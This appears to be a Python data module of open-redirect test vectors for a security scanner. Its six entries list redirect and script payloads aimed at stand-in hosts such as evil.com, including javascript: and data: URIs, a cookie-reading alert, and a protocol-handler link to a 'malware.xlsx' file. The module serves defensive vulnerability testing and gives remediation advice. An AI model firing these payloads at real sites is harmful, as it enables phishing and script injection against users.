"""
Open Redirect Test Vectors
Targets unvalidated redirects and forwards vulnerabilities
"""

from ..models import (
    TestVector,
    VulnerabilityType,
    TestVectorPosition as Position,
    PositionType,
    TestVectorPayload as PayloadTemplate,
    TestVectorEvidence as Evidence,
    ConfidenceLevel,
    SensitivityLevel,
)

OPEN_REDIRECT_VECTORS = [
    TestVector(
        id="open-redirect-url-001",
        name="Open Redirect via URL Parameter",
        description="Redirect users to attacker-controlled site using URL parameter",
        vuln_type=VulnerabilityType.OPEN_REDIRECT,
        position=Position(
            type=PositionType.QUERY, name="redirect", value_prefix="", value_suffix=""
        ),
        payload=PayloadTemplate(
            base="https://evil.com",
            variants=[
                "//evil.com",
                "https://evil.com@victim.com",
                "/\\evil.com",
                "https://victim.com.evil.com",
                "javascript:alert(document.domain)//https://victim.com",
            ],
            encoding="url",
        ),
        expected_evidence=Evidence(
            indicators=[
                "Redirect to external domain",
                "Location header to evil.com",
                "User redirected",
            ],
            confidence=ConfidenceLevel.HIGH,
        ),
        sensitivity=SensitivityLevel.MEDIUM,
        tags=["open-redirect", "phishing", "url-manipulation", "unvalidated-redirect"],
        references=[
            "https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html",
            "https://portswigger.net/kb/issues/00500100_open-redirection-reflected",
            "https://cwe.mitre.org/data/definitions/601.html",
        ],
        remediation="Validate redirect URLs against whitelist, use indirect references, avoid user-controlled redirects",
    ),
    TestVector(
        id="open-redirect-header-001",
        name="Open Redirect via Referer Header",
        description="Exploit referer-based redirect logic to redirect to attacker site",
        vuln_type=VulnerabilityType.OPEN_REDIRECT,
        position=Position(
            type=PositionType.HEADER, name="Referer", value_prefix="", value_suffix=""
        ),
        payload=PayloadTemplate(
            base="https://evil.com/phishing",
            variants=[
                "https://attacker.com",
                "http://evil.com?victim=https://victim.com",
                "https://victim.com.evil.com",
                "//evil.com/login",
            ],
            encoding="none",
        ),
        expected_evidence=Evidence(
            indicators=[
                "Redirect based on Referer",
                "Location to attacker site",
                "Referer-based routing",
            ],
            confidence=ConfidenceLevel.HIGH,
        ),
        sensitivity=SensitivityLevel.MEDIUM,
        tags=["open-redirect", "referer", "header-manipulation", "phishing"],
        references=[
            "https://owasp.org/www-community/attacks/Unvalidated_Redirects_and_Forwards",
            "https://www.acunetix.com/blog/web-security-zone/what-are-open-redirects/",
            "https://portswigger.net/web-security/dom-based/open-redirection",
        ],
        remediation="Do not trust Referer header for redirects, implement whitelist validation, use signed tokens",
    ),
    TestVector(
        id="open-redirect-javascript-001",
        name="Open Redirect via JavaScript window.location",
        description="Client-side redirect using JavaScript window.location with user input",
        vuln_type=VulnerabilityType.OPEN_REDIRECT,
        position=Position(type=PositionType.QUERY, name="next", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base="javascript:alert(1)",
            variants=[
                "javascript:window.location='https://evil.com'",
                "data:text/html,<script>location='https://evil.com'</script>",
                "vbscript:msgbox(1)",
                "javascript:void(window.open('https://evil.com'))",
            ],
            encoding="url",
        ),
        expected_evidence=Evidence(
            indicators=[
                "JavaScript protocol execution",
                "Client-side redirect",
                "window.location assignment",
            ],
            confidence=ConfidenceLevel.HIGH,
        ),
        sensitivity=SensitivityLevel.HIGH,
        tags=["open-redirect", "javascript", "xss", "dom-based", "client-side"],
        references=[
            "https://portswigger.net/web-security/dom-based/open-redirection",
            "https://book.hacktricks.xyz/pentesting-web/open-redirect",
            "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect",
        ],
        remediation="Sanitize URLs, block javascript: protocol, validate against whitelist, use CSP",
    ),
    TestVector(
        id="open-redirect-meta-refresh-001",
        name="Open Redirect via Meta Refresh Tag",
        description="Inject meta refresh tag to redirect users to attacker-controlled site",
        vuln_type=VulnerabilityType.OPEN_REDIRECT,
        position=Position(type=PositionType.QUERY, name="url", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base="0;url=https://evil.com",
            variants=[
                "0; URL=http://attacker.com/phishing",
                "0;url=//evil.com",
                "1;url=https://evil.com/steal-credentials",
                "0;URL='javascript:alert(document.cookie)'",
            ],
            encoding="url",
        ),
        expected_evidence=Evidence(
            indicators=[
                "Meta refresh tag in response",
                "Auto-redirect to external site",
                "0;url= in HTML",
            ],
            confidence=ConfidenceLevel.HIGH,
        ),
        sensitivity=SensitivityLevel.MEDIUM,
        tags=["open-redirect", "meta-refresh", "html-injection", "phishing"],
        references=[
            "https://owasp.org/www-community/attacks/Unvalidated_Redirects_and_Forwards",
            "https://developer.mozilla.org/en-US/docs/Web/HTML/Element/meta#http-equiv",
            "https://hackerone.com/reports/116110",
        ],
        remediation="Validate redirect URLs, sanitize meta tag content, implement CSP, use server-side redirects",
    ),
    TestVector(
        id="open-redirect-protocol-001",
        name="Open Redirect via Protocol Handler",
        description="Exploit custom protocol handlers to redirect or execute code",
        vuln_type=VulnerabilityType.OPEN_REDIRECT,
        position=Position(type=PositionType.QUERY, name="goto", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base="slack://open?team=T123456&id=D123456",
            variants=[
                "steam://openurl/https://evil.com",
                "zoommtg://zoom.us/join?confno=123456&pwd=evil",
                "ms-excel:ofe|u|https://evil.com/malware.xlsx",
                "mailto:victim@example.com?subject=Phishing&body=Click:%20https://evil.com",
                "tel:+1234567890",
            ],
            encoding="url",
        ),
        expected_evidence=Evidence(
            indicators=[
                "Custom protocol handler invoked",
                "Application opened",
                "Protocol redirect",
            ],
            confidence=ConfidenceLevel.HIGH,
        ),
        sensitivity=SensitivityLevel.HIGH,
        tags=["open-redirect", "protocol-handler", "application-protocol", "social-engineering"],
        references=[
            "https://positive.security/blog/url-open-rce",
            "https://embracethered.com/blog/posts/2020/discord-desktop-rce/",
            "https://blog.includesecurity.com/2018/03/a-tale-of-exploitation-in-spreadsheet.html",
        ],
        remediation="Validate protocol schemes against whitelist, warn users before protocol handler invocation",
    ),
    TestVector(
        id="open-redirect-dom-001",
        name="DOM-Based Open Redirect",
        description="Exploit DOM-based redirect using URL fragments and location manipulation",
        vuln_type=VulnerabilityType.OPEN_REDIRECT,
        position=Position(
            type=PositionType.PATH, name="fragment", value_prefix="#", value_suffix=""
        ),
        payload=PayloadTemplate(
            base="https://evil.com",
            variants=[
                "//evil.com",
                "https://victim.com@evil.com",
                "/\\\\evil.com",
                "https://evil.com%23@victim.com",
                "https://evil.com%2f%2f.victim.com",
            ],
            encoding="url",
        ),
        expected_evidence=Evidence(
            indicators=[
                "DOM redirect executed",
                "window.location modified",
                "Fragment-based redirect",
            ],
            confidence=ConfidenceLevel.HIGH,
        ),
        sensitivity=SensitivityLevel.MEDIUM,
        tags=["open-redirect", "dom-based", "client-side", "fragment", "xss"],
        references=[
            "https://portswigger.net/web-security/dom-based/open-redirection",
            "https://owasp.org/www-community/attacks/DOM_Based_XSS",
            "https://www.acunetix.com/blog/web-security-zone/dom-based-open-redirects/",
        ],
        remediation="Validate redirect URLs in JavaScript, use relative URLs only, implement CSP",
    ),
]
